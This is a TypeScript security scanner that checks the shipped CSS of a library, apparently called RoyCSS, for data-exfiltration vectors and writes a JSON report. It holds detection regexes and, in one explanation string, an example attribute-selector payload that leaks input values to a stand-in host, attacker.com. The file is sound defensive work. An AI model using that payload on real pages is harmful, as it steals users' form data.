/**
 * security/css-exfiltration-check.ts
 *
 * Scans every shipped CSS artifact for data-exfiltration vectors:
 *
 *   1. `url(http...)`, `url(https...)`, `url(//...)`  — external URL leak
 *   2. `@import`                                       — CSS import (any)
 *   3. `@font-face` with `src: url(http...)`           — external font load
 *   4. Attribute selectors combined with `url()`       — value exfiltration
 *      e.g. `input[value^="a"] { background: url(...) }`
 *
 * Inputs scanned:
 *   - dist/roycss.css         (compiled library CSS — 1,569 effects)
 *   - dist/roycss.min.css     (minified production CSS)
 *   - dist/effects.json       (effect metadata — verified to contain no cssCode)
 *   - src/lib/effects-batch-*.ts (source TypeScript — for parity)
 *
 * Output: `security/results/css-exfiltration-report.json`
 *
 * Exit code: 0 if 0 issues, 1 otherwise.
 */

import { readFileSync, writeFileSync, mkdirSync, existsSync, readdirSync } from "node:fs";
import { join } from "node:path";

const ROOT = join(import.meta.dir, "..");
const RESULTS_DIR = join(import.meta.dir, "results");
const REPORT_PATH = join(RESULTS_DIR, "css-exfiltration-report.json");

interface Issue {
  file: string;
  line: number;
  column: number;
  effectId: string | null;
  issue: "external-url" | "import" | "font-face-external" | "attr-selector-url" | "external-protocol";
  snippet: string;
  explanation: string;
}

interface Report {
  generatedAt: string;
  filesScanned: string[];
  effectCount: number;
  issues: Issue[];
  exitCode: number;
}

const EXTERNAL_URL_RE = /url\(\s*['"]?(?:https?:|\/\/)[^)]*\)/gi;
const ANY_URL_RE = /url\(\s*['"]?([^)'"]+)['"]?\s*\)/gi;
const IMPORT_RE = /@import\s+(?:url\()?\s*['"]?([^)'"\s;]+)['"]?\s*\)?\s*[^;]*;?/gi;
const FONT_FACE_RE = /@font-face\s*\{[^}]*?\}/gis;
const FONT_FACE_SRC_EXTERNAL_RE = /src\s*:[^;}]*url\(\s*['"]?(?:https?:|\/\/)[^)]*\)/gi;
const ATTR_SELECTOR_RE = /\[\s*[a-zA-Z_-][a-zA-Z0-9_-]*\s*(?:\^=|\$=|\*=|=)[^\]]*\]/g;
// A "rule" is roughly: selector(s) { declarations }
// We split the CSS into top-level rule blocks and check each block for
// the combination of attr selector + url().

function splitRules(css: string): Array<{ selector: string; body: string; line: number; lineOffset: number }> {
  // Walk the CSS, tracking brace depth. Each top-level `{` starts a body;
  // the preceding text (back to the previous `;` or `}` or start) is the selector.
  const rules: Array<{ selector: string; body: string; line: number; lineOffset: number }> = [];
  let depth = 0;
  let ruleStart = 0;
  let lastBrace = -1;
  // Track line numbers
  const linesBefore = (idx: number) => {
    let n = 1;
    for (let i = 0; i < idx; i++) if (css[i] === "\n") n++;
    return n;
  };

  for (let i = 0; i < css.length; i++) {
    const c = css[i];
    if (c === "{") {
      if (depth === 0) {
        const selector = css.slice(ruleStart, i).trim();
        const bodyStart = i + 1;
        // Find the matching close brace
        let j = i + 1;
        let innerDepth = 1;
        while (j < css.length && innerDepth > 0) {
          if (css[j] === "{") innerDepth++;
          else if (css[j] === "}") innerDepth--;
          if (innerDepth === 0) break;
          j++;
        }
        const body = css.slice(bodyStart, j);
        rules.push({
          selector,
          body,
          line: linesBefore(ruleStart),
          lineOffset: ruleStart,
        });
        lastBrace = j;
        i = j;
        ruleStart = j + 1;
      } else {
        depth++;
      }
    } else if (c === "}") {
      if (depth > 0) depth--;
      else ruleStart = i + 1;
    }
  }
  return rules;
}

function findEffectIdNearLine(content: string, line: number): string | null {
  // Look backwards from `line` for the most recent effect id comment or
  // `.roycss-XXX` selector.
  const lines = content.split("\n").slice(0, line);
  for (let i = lines.length - 1; i >= 0; i--) {
    const l = lines[i];
    const idComment = l.match(/\/\*\s*([a-z0-9-]+)\s*\*\//i);
    if (idComment) return idComment[1];
    const idSel = l.match(/\.roycss-([a-z0-9-]+)/i);
    if (idSel) return idSel[1];
  }
  return null;
}

function scanFile(filePath: string, issues: Issue[]): number {
  if (!existsSync(filePath)) return 0;
  const content = readFileSync(filePath, "utf8");
  const lines = content.split("\n");
  let effectCount = 0;
  const effectCountMatch = content.match(/\.roycss-[a-z0-9-]+/g);
  if (effectCountMatch) effectCount = new Set(effectCountMatch).size;

  // 1. External url() — by line for accurate line numbers
  lines.forEach((line, idx) => {
    let m: RegExpExecArray | null;
    EXTERNAL_URL_RE.lastIndex = 0;
    while ((m = EXTERNAL_URL_RE.exec(line)) !== null) {
      issues.push({
        file: filePath,
        line: idx + 1,
        column: m.index + 1,
        effectId: findEffectIdNearLine(content, idx + 1),
        issue: "external-url",
        snippet: line.trim().slice(0, 200),
        explanation: `External URL in CSS — leaks consumer IP + Referer to ${m[0].slice(0, 80)}…`,
      });
    }
    IMPORT_RE.lastIndex = 0;
    while ((m = IMPORT_RE.exec(line)) !== null) {
      issues.push({
        file: filePath,
        line: idx + 1,
        column: m.index + 1,
        effectId: findEffectIdNearLine(content, idx + 1),
        issue: "import",
        snippet: line.trim().slice(0, 200),
        explanation: `@import in CSS — imported CSS runs in the consumer page's origin and can include any exfiltration vector.`,
      });
    }
  });

  // 2. @font-face with external src
  FONT_FACE_RE.lastIndex = 0;
  let ffm: RegExpExecArray | null;
  while ((ffm = FONT_FACE_RE.exec(content)) !== null) {
    const block = ffm[0];
    FONT_FACE_SRC_EXTERNAL_RE.lastIndex = 0;
    if (FONT_FACE_SRC_EXTERNAL_RE.test(block)) {
      // Find the line number of the @font-face start
      const before = content.slice(0, ffm.index);
      const line = before.split("\n").length;
      issues.push({
        file: filePath,
        line,
        column: 1,
        effectId: null,
        issue: "font-face-external",
        snippet: block.slice(0, 200),
        explanation: "@font-face with external src url — leaks consumer IP and lets attacker serve a malicious font.",
      });
    }
  }

  // 3. Attribute selectors combined with url()
  const rules = splitRules(content);
  for (const rule of rules) {
    ATTR_SELECTOR_RE.lastIndex = 0;
    const hasAttrSelector = ATTR_SELECTOR_RE.test(rule.selector);
    if (!hasAttrSelector) continue;
    ANY_URL_RE.lastIndex = 0;
    const hasUrl = ANY_URL_RE.test(rule.body);
    if (!hasUrl) continue;
    // Check it's not just url(#id) or data:
    ANY_URL_RE.lastIndex = 0;
    let m: RegExpExecArray | null;
    let hasExternal = false;
    while ((m = ANY_URL_RE.exec(rule.body)) !== null) {
      const url = m[1].trim();
      if (/^(?:https?:|\/\/)/i.test(url)) {
        hasExternal = true;
        break;
      }
      // Even data: URLs in attr-selector rules are suspicious (data exfil via timing)
      if (url.startsWith("data:")) {
        hasExternal = true;
        break;
      }
    }
    if (hasExternal) {
      issues.push({
        file: filePath,
        line: rule.line,
        column: 1,
        effectId: findEffectIdNearLine(content, rule.line),
        issue: "attr-selector-url",
        snippet: rule.selector.slice(0, 200),
        explanation: "Attribute selector combined with url() — classic CSS data exfiltration vector (e.g. input[value^=\"a\"] { background: url(attacker.com/?a) }).",
      });
    }
  }

  return effectCount;
}

function scanEffectsBatchFiles(): { filesScanned: string[]; issues: Issue[]; effectCount: number } {
  const filesScanned: string[] = [];
  const issues: Issue[] = [];
  let effectCount = 0;
  const batchDir = join(ROOT, "src", "lib");
  if (!existsSync(batchDir)) return { filesScanned, issues, effectCount };
  const files = readdirSync(batchDir).filter((f) => /^effects-batch-\d+\.ts$/.test(f));
  for (const f of files) {
    const full = join(batchDir, f);
    filesScanned.push(full);
    effectCount += scanFile(full, issues);
  }
  return { filesScanned, issues, effectCount };
}

function main(): number {
  mkdirSync(RESULTS_DIR, { recursive: true });

  const issues: Issue[] = [];
  const filesScanned: string[] = [];
  let effectCount = 0;

  // 1. Compiled CSS files
  for (const rel of ["dist/roycss.css", "dist/roycss.min.css", "dist/effects.json"]) {
    const full = join(ROOT, rel);
    if (!existsSync(full)) {
      console.warn(`[css-exfil] skipping (not found): ${full}`);
      continue;
    }
    filesScanned.push(full);
    effectCount += scanFile(full, issues);
  }

  // 2. Source TypeScript effect batches
  const batchResult = scanEffectsBatchFiles();
  filesScanned.push(...batchResult.filesScanned);
  effectCount = Math.max(effectCount, batchResult.effectCount);
  issues.push(...batchResult.issues);

  // De-duplicate issues by (file, line, issue, snippet)
  const seen = new Set<string>();
  const deduped = issues.filter((i) => {
    const key = `${i.file}:${i.line}:${i.issue}:${i.snippet.slice(0, 60)}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
  deduped.sort((a, b) => a.file.localeCompare(b.file) || a.line - b.line);

  const exitCode = deduped.length === 0 ? 0 : 1;
  const report: Report = {
    generatedAt: new Date().toISOString(),
    filesScanned,
    effectCount,
    issues: deduped,
    exitCode,
  };
  writeFileSync(REPORT_PATH, JSON.stringify(report, null, 2));

  console.log("═══════════════════════════════════════════════════════════");
  console.log(" RoyCSS CSS exfiltration check");
  console.log("═══════════════════════════════════════════════════════════");
  console.log(` Generated:    ${report.generatedAt}`);
  console.log(` Files scanned:${filesScanned.length}`);
  for (const f of filesScanned) console.log(`   - ${f.replace(ROOT + "/", "")}`);
  console.log(` Effects seen: ${effectCount} (unique .roycss-* selectors)`);
  console.log("");
  console.log(` Issues:       ${deduped.length}`);
  if (deduped.length > 0) {
    const byType: Record<string, number> = {};
    for (const i of deduped) byType[i.issue] = (byType[i.issue] || 0) + 1;
    for (const [t, n] of Object.entries(byType)) console.log(`   ${t}: ${n}`);
    console.log("");
    console.log(" Top 20 issues:");
    for (const i of deduped.slice(0, 20)) {
      console.log(`   [${i.issue}] ${i.file.replace(ROOT + "/", "")}:${i.line} (${i.effectId ?? "?"})`);
      console.log(`     ${i.explanation}`);
    }
    if (deduped.length > 20) console.log(`   ... and ${deduped.length - 20} more (see results/css-exfiltration-report.json)`);
  }
  console.log("");
  console.log("═══════════════════════════════════════════════════════════");
  console.log(` ${exitCode === 0 ? "✅ PASS" : "❌ FAIL"} — ${exitCode === 0 ? "0 exfiltration vectors found." : `${deduped.length} exfiltration vectors found.`}`);
  console.log("═══════════════════════════════════════════════════════════");
  console.log(` Report written to: ${REPORT_PATH}`);
  console.log("");

  return exitCode;
}

try {
  process.exit(main());
} catch (err) {
  console.error("css-exfiltration-check.ts: uncaught error:", err);
  process.exit(2);
}
